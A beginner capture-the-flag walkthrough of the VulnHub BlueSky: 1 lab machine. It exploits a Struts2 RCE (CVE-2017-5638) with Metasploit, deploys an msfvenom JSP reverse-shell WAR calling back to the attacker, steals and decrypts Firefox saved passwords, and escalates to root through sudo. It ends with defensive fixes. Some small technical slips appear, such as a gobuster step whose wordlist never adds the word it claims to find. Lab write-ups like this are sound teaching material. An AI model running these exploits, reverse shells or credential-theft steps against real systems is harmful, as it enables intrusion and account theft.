# BlueSky: 1 (VulnHub) — A Beginner-Friendly Walkthrough

| Field | Value |
|---|---|
| **Machine** | BlueSky: 1 |
| **Difficulty** | Beginner / Easy |
| **Author** | SunCSR Team |
| **Released** | 10 December 2020 |
| **VulnHub Entry** | https://vulnhub.com/entry/bluesky-1,623/ |
| **Download** | https://vulnhub.com/entry/bluesky-1,623/#download |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux (Ubuntu, Apache Tomcat + Apache Struts2 on port 8080) |

> **Note on the network:** every command below assumes the Kali attacker is
> `192.168.56.10` and the BlueSky VM is `192.168.56.101`. Substitute your own IPs
> if your host-only network uses a different range. BlueSky ships as an `.ova`;
> import it into VirtualBox/VMware and put both VMs on the same host-only
> network. The author notes it behaves better on VMware than VirtualBox, but it
> works on both.

> **Goal:** get a root shell (`root@localhost:~#`) and read the flag in `/root`.

---

## 0. What you will learn

By the end of this walkthrough you will have practised, on a real (but safe,
offline) target:

1. **Host discovery** — finding the target VM's IP on your local network.
2. **Port & service scanning** — seeing that a **Tomcat** web server is running
   on a non-standard port (`8080`).
3. **Content discovery with a *custom* wordlist** — the standard Kali wordlists
   miss the important directory, so we learn to add app-specific words.
4. **Recognising a known CVE** — spotting the **Apache Struts2** framework and
   mapping it to **CVE-2017-5638** (the "Equifax" bug).
5. **Remote code execution (RCE)** — turning that bug into a shell.
6. **Reading a config file for credentials** — pulling Tomcat's manager password
   out of `tomcat-users.xml`.
7. **Deploying a malicious `.war`** — abusing a legit admin feature to get a
   stabler, fully interactive shell.
8. **Post-exploitation enumeration** — reading a user's `.bash_history` for
   clues.
9. **Cracking saved browser passwords** — extracting Firefox's `key4.db` and
   decrypting it with `firefox_decrypt`.
10. **Privilege escalation via `sudo`** — using a reused password and the `sudo`
    group to become root.

> **The intended chain in one breath:** nmap finds SSH (22) and Tomcat (8080) →
> a custom wordlist reveals `/struts2-showcase/` → the Struts2 app is vulnerable
> to **CVE-2017-5638** → we get a shell as the Tomcat user (`minhtuan`) →
> `tomcat-users.xml` leaks the manager password → we deploy a malicious WAR for
> a full shell → `.bash_history` points at the Firefox profile → `firefox_decrypt`
> recovers `minhtuan`'s password `skysayohyeah` → `minhtuan` is in the `sudo`
> group → `sudo su` → root.

---

## 1. Reconnaissance — finding the target

### 1.1 Identify your own IP

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **Why it works:** `ip a` lists every interface and its address. Our attacker is
> `192.168.56.10/24`, so the whole subnet is `192.168.56.0–255`. The target lives
> somewhere in that range.

### 1.2 Sweep the subnet for the target

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.1    08:00:27:xx:xx:xx   PCS Systemtechnik GmbH   (VirtualBox host)
192.168.56.10   08:00:27:aa:aa:aa   PCS Systemtechnik GmbH   (our Kali)
192.168.56.101  08:00:27:bb:bb:bb   PCS Systemtechnik GmbH   <-- target
```

Or with `netdiscover`:

```bash
sudo netdiscover -r 192.168.56.0/24
```

> **Why it works:** both tools send ARP requests ("who has this IP?") across the
> local subnet and list everyone who answers. ARP works only on your own local
> network, which is exactly where lab VMs live. The `08:00:27` MAC prefix is
> VirtualBox's default vendor — a strong hint the host is a VM.

**Target confirmed: `192.168.56.101`.**

![Finding the target IP](images/01-netdiscover.png)

---

## 2. Enumeration

### 2.1 Scan for open ports and services

```bash
sudo nmap -sC -sV -p- -oN bluesky.nmap 192.168.56.101
```

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Apache Tomcat 9.0.x
|_http-title: Apache Tomcat/9.0.x
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **Why it works:**
> - `-p-` scans **all** 65535 ports. Tomcat is on `8080`, which some "top 1000"
>   scans would still catch — but always scan everything on a CTF.
> - `-sV` identifies the software and version behind each port.
> - `-sC` runs Nmap's default scripts, which often grab the page title for free.
>
> Two services matter: **SSH (22)** and a web server on **8080**. SSH needs
> credentials we don't have, so the web server is our attack surface.

*(Version strings vary slightly by build — trust your own scan output.)*

### 2.2 Look at the web server

Browse to `http://192.168.56.101:8080/`. You get the default **Apache Tomcat**
landing page with links to `/docs`, `/examples`, and `/manager`.

```bash
curl -s http://192.168.56.101:8080/ | head
```

```text
<title>Apache Tomcat/9.0.x</title>
```

> **Why it works:** the default page tells us the server is Tomcat. The obvious
> first move is to try the **Manager App** with default credentials — but on this
> box those fail. We need to find the hidden application instead.

### 2.3 Directory busting — and why the default wordlist fails

Start with the usual list:

```bash
gobuster dir -u http://192.168.56.101:8080 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

```text
/docs        (Status: 302)
/examples    (Status: 302)
/manager     (Status: 302)
```

Nothing exploitable. This is the key lesson of the box: **don't rely only on the
wordlists that ship with Kali.** Add words relevant to the technology you found
(Tomcat → Struts, Spring, Jenkins, etc.). One favourite extra word is `struts2`:

```bash
gobuster dir -u http://192.168.56.101:8080 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  -x txt,action
```

```text
/struts2-showcase   (Status: 302) [--> /struts2-showcase/]
```

> **Why it works:** `gobuster dir` requests `http://target/<word>` for every word
> and reports anything that is not a `404`. Tomcat bundles a demo web app called
> **`struts2-showcase`** by default in some builds — and anything with a name like
> that is worth a look.

Browsing `http://192.168.56.101:8080/struts2-showcase/` shows the Apache Struts2
demo application. `showcase.action` is the interesting endpoint.

![Gobuster finding struts2-showcase](images/02-gobuster.png)

### 2.4 Confirm the Struts2 vulnerability

We now know the framework. A quick check with Nikto or Nmap's CVE script can
confirm it:

```bash
nmap -p8080 --script http-vuln-cve2017-5638 192.168.56.101
```

```text
8080/tcp open  http
| http-vuln-cve2017-5638:
|   VULNERABLE:
|   Apache Struts 2 Jakarta Multipart Parser RCE (CVE-2017-5638)
|_  State: VULNERABLE
```

> **Why it works:** the script sends a crafted `Content-Type` header and looks at
> how the server reacts. A vulnerable Struts returns an error that reveals the
> version and the bug.

---

## 3. Foothold — gaining the first shell

### 3.1 The vulnerability: CVE-2017-5638 (Struts2 "S2-045")

Apache Struts2 used Apache Commons FileUpload to parse the `Content-Type` header
of multipart requests. The header was evaluated as an **OGNL** expression
(Struts2's template language), and OGNL can call arbitrary Java code. An attacker
sends a request whose `Content-Type` contains an OGNL payload, and the server
executes it.

> **Why it works:** this is the famous bug behind the 2017 **Equifax** breach.
> Equifax simply never patched it. Here, the author recreated the same mistake.
> Because the header is attacker-controlled and evaluated server-side, we get
> **remote code execution** with no login.

### 3.2 Exploit with Metasploit

Kali ships a module for this:

```bash
msfconsole -q
```

```text
msf6 > use exploit/multi/http/struts2_content_type_ognl
msf6 > set RHOSTS 192.168.56.101
msf6 > set RPORT 8080
msf6 > set TARGETURI /struts2-showcase/showcase.action
msf6 > set LHOST 192.168.56.10
msf6 > set LPORT 4444
msf6 > run
```

```text
[*] Started reverse TCP handler on 192.168.56.10:4444
[*] Sending stage ...
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: minhtuan
```

> **Why it works:** the module builds the malicious `Content-Type` header for us
> and catches the callback. We land as **`minhtuan`** — the account Tomcat runs
> under on this build. (Some builds show a different low-privilege service
> account; the Firefox profile we hunt later still belongs to `minhtuan`.)

Drop into a shell and look around:

```text
meterpreter > shell
id
```

```text
uid=1000(minhtuan) gid=1000(minhtuan) groups=1000(minhtuan)
```

Read the first flag:

```bash
cat ~/user.txt
```

```text
Try your best, you have passed the first challenge, and the last one is for you, root me!
```

> **Why it works:** the user flag confirms we have a foothold. The message tells
> us a privilege escalation is required.

### 3.3 Read Tomcat's config for the manager password

Tomcat's user database is a plain XML file:

```bash
cat /usr/local/tomcat/conf/tomcat-users.xml
```

```text
<user username="admin" password="6mzf3>gfZ.pN8_Mp" roles="manager-gui,admin-gui"/>
```

> **Why it works:** Tomcat stores the Manager App credentials in cleartext in
> `tomcat-users.xml`. Whoever can read the filesystem can read the password. Now
> we can log in to the **Manager App** at `http://192.168.56.101:8080/manager`.

### 3.4 Deploy a malicious WAR for a full shell

The Meterpreter session can't run things like `sudo` or `python` well. The
Tomcat Manager can **deploy a `.war` file**, and a WAR is just a container we can
pack with a JSP reverse shell. Build one:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.10 LPORT=5555 -f war -o reverse.war
```

Start a listener:

```bash
nc -nlvp 5555
```

Log in to the Manager App as `admin`, scroll to **"WAR file to deploy"**, upload
`reverse.war`, and click **Deploy**. A new entry `/reverse_shell` appears. Click
or browse to it to trigger the shell:

```
http://192.168.56.101:8080/reverse_shell/
```

Back in `nc`:

```text
connect to [192.168.56.10] from 192.168.56.101
```

> **Why it works:** uploading a WAR is a **legitimate admin feature** — no bug is
> needed once you are an admin. The server unpacks the archive and serves the
> embedded JSP, which connects back to our listener.

Upgrade to a proper TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

> **Why it works:** a raw netcat shell has no tab completion and often can't run
> interactive programs. Spawning a pseudo-terminal fixes that.

![Reverse shell as minhtuan](images/03-reverse-shell.png)

### 3.5 Read the shell history for clues

`.bash_history` records the commands the user actually typed — a goldmine:

```bash
cat ~/.bash_history
```

```text
cd .mozilla/firefox
...
wget ...
cat /usr/local/tomcat/conf/tomcat-users.xml
```

> **Why it works:** the history shows `minhtuan` was poking around the **Firefox
> profile**. Browsers store saved logins on disk, and we can decrypt them.

---

## 4. Privilege escalation — becoming root

### 4.1 Locate the Firefox credential files

```bash
ls -la ~/.mozilla/firefox/
```

```text
drwx------  fvbljmev.default-release
drwx------  1snfwp29.default
```

Go into the profile that has login data:

```bash
cd ~/.mozilla/firefox/fvbljmev.default-release
ls -la
```

```text
-rw-------  key4.db
-rw-------  logins.json
```

> **Why it works:** Firefox stores saved usernames/passwords encrypted in
> **`logins.json`**, and the key that decrypts them in **`key4.db`**. Both files
> live in the user's profile directory. (Very old Firefox used `key3.db`; modern
> builds use `key4.db` — the file we see here.) If we can copy both files, we can
> decrypt every saved password **offline**.

### 4.2 Copy the files to Kali

Serve them from the target:

```bash
python3 -m http.server 8000
```

On Kali, download them:

```bash
wget http://192.168.56.101:8000/key4.db
wget http://192.168.56.101:8000/logins.json
```

> **Why it works:** plain HTTP moves raw bytes; we now have the encrypted store
> locally where we control the tooling. (The 3-second `python3 -m http.server` is
> the beginner's file-transfer workhorse.)

### 4.3 Decrypt the saved passwords

Grab `firefox_decrypt`:

```bash
git clone https://github.com/unode/firefox_decrypt.git
cd firefox_decrypt
python3 firefox_decrypt.py /path/to/downloaded/files/
```

```text
Website:   https://www.example.com
Username:  minhtuan
Password:  skysayohyeah
```

> **Why it works:** `firefox_decrypt` uses the master key in `key4.db` to
> decrypt `logins.json`. No master password was set, so the keys are usable
> directly — an extremely common real-world situation. We now have a plaintext
> password: **`minhtuan` / `skysayohyeah`**.
>
> *(An equivalent tool is `firepwd` — `git clone https://github.com/lclevy/firepwd`
> then `python3 firepwd.py`. Either works.)*

### 4.4 Use the password and check sudo rights

First confirm the account's privileges — you may need a full TTY:

```bash
groups minhtuan
sudo -l
```

```text
uid=1000(minhtuan) gid=1000(minhtuan) groups=1000(minhtuan),27(sudo)
User minhtuan may run the following commands on bluesky:
    (ALL : ALL) ALL
```

> **Why it works:** `minhtuan` is a member of the **`sudo`** group, and `sudo -l`
> says the account may run **anything** as root. All we were missing was the
> password — which we just recovered.

You can either SSH in for a clean session or keep the current shell. SSH:

```bash
ssh minhtuan@192.168.56.101
# password: skysayohyeah
```

Then escalate:

```bash
sudo su
```

```text
root@bluesky:/home/minhtuan# id
uid=0(root) gid=0(root) groups=0(root)
root@bluesky:~# cat /root/root.txt
FLAG: <root flag here>
```

> **Why it works:** `sudo su` asks for *minhtuan's* password, not root's. We have
> it. With `(ALL : ALL) ALL`, sudo grants a root shell directly. Game over.

![Root shell and root flag](images/04-root-shell.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Location | Impact | Fix |
|---|---|---|---|---|
| 1 | **Unpatched Apache Struts2 RCE (CVE-2017-5638)** | `/struts2-showcase/showcase.action` | Unauthenticated remote code execution | Patch Struts2; remove the demo `showcase` app |
| 2 | **Tomcat demo/sample apps exposed** | `/struts2-showcase`, `/examples`, `/docs` | Increases attack surface / hides the vulnerable app | Remove sample webapps in production |
| 3 | **Cleartext credentials in config** | `/usr/local/tomcat/conf/tomcat-users.xml` | Leaks the Manager App password | Use hashed/role-limited manager accounts; restrict file perms |
| 4 | **WAR deploy privilege** | Tomcat Manager App | Any manager can deploy a web shell → RCE | Disable Manager on internet-facing hosts; tight roles |
| 5 | **Sensitive data in shell history** | `~/.bash_history` | Reveals the Firefox profile path | Don't leave secrets in history; clear/limit history |
| 6 | **Saved browser passwords recoverable** | `~/.mozilla/firefox/*/key4.db`, `logins.json` | Plaintext account password | Use a Firefox master password / OS keyring |
| 7 | **Over-broad sudo rights** | `minhtuan` in `sudo` group, `(ALL:ALL) ALL` | Full root compromise once password is known | Grant only specific commands; enforce least privilege |
| 8 | **Password reuse / weak saved password** | `skysayohyeah` | Bridges browser leak → system login | Unique passwords; never save them unencrypted |

---

## 6. Defensive lessons (blue team)

- **Patch aggressively.** CVE-2017-5638 was fixed in March 2017, yet it took down
  Equifax months later. A known, public RCE on an internet-facing server is the
  single most dangerous thing on this box.
- **Remove demo and sample applications** (`showcase`, `examples`, `docs`) from
  production Tomcat. They add attack surface and, as here, hide the bug.
- **Never store manager credentials in cleartext.** `tomcat-users.xml` should use
  strong, role-scoped accounts, and the file should be root-only.
- **Disable the Manager App** (or bind it to localhost) unless it is genuinely
  required. WAR deployment is a code-execution primitive by design.
- **Treat browser password stores as secrets.** Set a Firefox *master password*
  or back the store with the OS keyring, so copying `key4.db` is not enough.
- **Apply least privilege to sudo.** `(ALL:ALL) ALL` for a service account is a
  root-level risk. Scope sudo to exact commands.
- **Assume any file a web user can read will be read.** History files, configs,
  and profile directories all leaked something useful here.
- **Monitor and alert** on anomalous `Content-Type` headers and unexpected WAR
  deployments — both are detectable signals.

---

## 7. References

- VulnHub — BlueSky: 1 entry: https://vulnhub.com/entry/bluesky-1,623/
- CVE-2017-5638 (NVD): https://nvd.nist.gov/vuln/detail/CVE-2017-5638
- Apache Struts S2-045 advisory: https://cwiki.apache.org/confluence/display/WW/S2-045
- Metasploit — `struts2_content_type_ognl`: https://www.rapid7.com/db/modules/exploit/multi/http/struts2_content_type_ognl/
- `firefox_decrypt` tool: https://github.com/unode/firefox_decrypt
- `firepwd` tool (alternative): https://github.com/lclevy/firepwd
- John Bush — "Vulnhub — BlueSky 1 Write-up": https://jhnbsh.medium.com/vulnhub-bluesky-1-write-up-4f16171e3c1e
- NepCodeX — "BlueSky Walkthrough": https://nepcodex.com/2021/07/bluesky-walkthrough-vulnhub-writeup/
- tyskill — "[vulnhub] BlueSky_1": https://tyskill.github.io/posts/vulnhub_bluesky_1/

---

## 8. Screenshot checklist

Capture these as you go so you can reproduce the writeup with images. Save them
in `images/` with the filenames used in this document.

- [ ] `images/01-netdiscover.png` — `arp-scan`/`netdiscover` showing `192.168.56.101`
- [ ] `images/02-gobuster.png` — gobuster discovering `/struts2-showcase`
- [ ] `images/03-reverse-shell.png` — the Meterpreter/netcat shell as `minhtuan`
- [ ] `images/04-root-shell.png` — `id` showing `uid=0(root)` and `/root/root.txt`
- [ ] `images/05-nmap.png` — nmap showing SSH (22) and Tomcat (8080)
- [ ] `images/06-struts-cve.png` — Nmap CVE script or Nikto confirming CVE-2017-5638
- [ ] `images/07-tomcat-users.png` — `tomcat-users.xml` leaking the manager password
- [ ] `images/08-war-deploy.png` — deploying `reverse.war` in the Tomcat Manager
- [ ] `images/09-firefox-key4.png` — the `key4.db` / `logins.json` files
- [ ] `images/10-firefox-decrypt.png` — `firefox_decrypt` revealing `skysayohyeah`
- [ ] `images/11-sudo-l.png` — `sudo -l` / `groups` showing sudo membership

---

*BlueSky: 1 is a great "second box": it teaches you to look past the default
wordlists, recognises a real-world CVE, and ends with a very human failure —
a saved browser password and an over-privileged account. Try to solve each stage
yourself before reading ahead.*
